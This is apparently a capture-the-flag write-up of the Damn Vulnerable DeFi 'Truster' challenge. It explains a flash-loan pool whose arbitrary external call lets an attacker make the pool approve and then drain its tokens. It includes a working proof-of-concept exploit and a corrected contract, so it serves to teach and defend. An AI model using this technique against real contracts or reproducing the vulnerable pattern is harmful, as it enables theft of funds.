# The Arbitrary Call Vulnerability â€” Draining the Truster Pool

**Author:** ShiningSugar

**Date:** 2025-11-03

**Tags:** Smart Contract Security, DeFi, Calldata Attack, ERC20 Approval

-----

## 1. Background: A Pool That Trusts Too Much

This is my post-mortem for the third Damn Vulnerable DeFi challenge, **"Truster"**.

The scenario is a lending pool holding 1,000,000 DVT (DamnValuableToken) tokens. The pool offers flash loans, which seems standard. The goal is simple and direct: **steal all 1 million tokens from the pool.**

This challenge perfectly demonstrates how a single, "flexible" feature, when implemented without zero-trust validation, becomes a fatal security hole. The pool trusts its user to provide arbitrary execution data, and we can use that trust to drain it completely.

## 2. Code Analysis: The functionCall Backdoor

The vulnerability is contained entirely within the `TrusterLenderPool.sol` contract and its `flashLoan` function.

Here is the relevant (and fatal) part of the code:

```
function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
) external nonReentrant {
    
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    if (balanceBefore < borrowAmount) revert NotEnoughTokensInPool();

    damnValuableToken.transfer(borrower, borrowAmount);

    // THE VULNERABILITY: Arbitrary external call
    target.functionCall(data);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    if (balanceAfter < balanceBefore) revert FlashLoanHasNotBeenPaidBack();
}
```

The problem is the `target.functionCall(data)` line.

  * **target**: A user-supplied address.
  * **data**: User-supplied calldata.

The `functionCall` utility from `Address.sol` is just a wrapper for a low-level `.call()`. This means the pool contract will execute a call to *any* address (`target`) with *any* data we provide, all while **the `msg.sender` of that call is the pool contract itself.**

## 3. The Attack (PoC): Stealing Approval

We know that a direct token transfer during the flash loan will be caught by the `balanceAfter < balanceBefore` check. The transaction would simply revert.

But what if we don't steal the tokens? What if we steal **the *permission* to move the tokens**?

The attack is a two-step process:

### Step 1: Call flashLoan() to Gain Approval

First, we craft a malicious `calldata` payload. We want the `Pool` contract to call the `DVT` token contract and approve *us* (the attacker) to spend all of its tokens.

1.  **borrowAmount**: We set this to `0`. This is critical. By "borrowing" 0 tokens, the `balanceBefore` will equal the `balanceAfter`, and we will pass the repayment check.
2.  **target**: We set this to the `address(dvt)`, the token contract itself.
3.  **data**: We encode the function call for `approve(address spender, uint256 amount)`.
      * spender: address(attacker)
      * amount: TOKENS_IN_POOL (1 million)

The full exploit call within our test looks like this:

```
// 1. Craft the malicious calldata
bytes memory data = abi.encodeWithSignature(
    "approve(address,uint256)",
    address(attacker),
    TOKENS_IN_POOL
);

// 2. Call the flashLoan
vm.prank(attacker);
trusterLenderPool.flashLoan(
    0, // borrowAmount
    address(attacker), // borrower
    address(dvt), // target
    data // malicious data
);
```

When `target.functionCall(data)` executes, the `DVT` contract receives a call. It checks `msg.sender` and sees the `TrusterLenderPool` address. It then executes the `approve` function, setting the allowance for the attacker.

The flash loan finishes, the repayment check passes, and the transaction completes.

### Step 2: Call transferFrom() to Steal the Tokens

The hard part is over. The `TrusterLenderPool` is now completely vulnerable. In a separate, subsequent transaction, the attacker simply calls `transferFrom()` on the DVT contract.

```
// 3. The final heist
vm.prank(attacker);
dvt.transferFrom(
    address(trusterLenderPool), // from (the owner)
    address(attacker), // to
    TOKENS_IN_POOL // amount
);
```

This call succeeds because of the approval we gained in Step 1. The pool is now empty.

## 4. Defense & Fix

The fix is simple and absolute: **Do not allow arbitrary external calls from a contract that holds funds.**

```
// FIXED
function flashLoan(uint256 borrowAmount) external nonReentrant {
    
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    if (balanceBefore < borrowAmount) revert NotEnoughTokensInPool();

    damnValuableToken.transfer(msg.sender, borrowAmount);
    
    // Call the borrower contract's designated receiver function
    // (This is what a *real* flash loan does)
    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    if (balanceAfter < balanceBefore) revert FlashLoanHasNotBeenPaidBack();
}
```

By removing the `target` and `data` parameters and only calling a known interface function on the `msg.sender`, the contract's functionality is restricted to its intended purpose.

## 5. Conclusion: Key Lessons

**1) Never Trust User-Supplied target and data**: Allowing users to control the destination and payload of an external call is a critical vulnerability.

**2) ERC-20 approve is a High-Value Target**: The `approve`/`transferFrom` mechanism is a common attack vector. Any vulnerability that allows an attacker to make a contract call `approve` is equivalent to a total loss of funds.
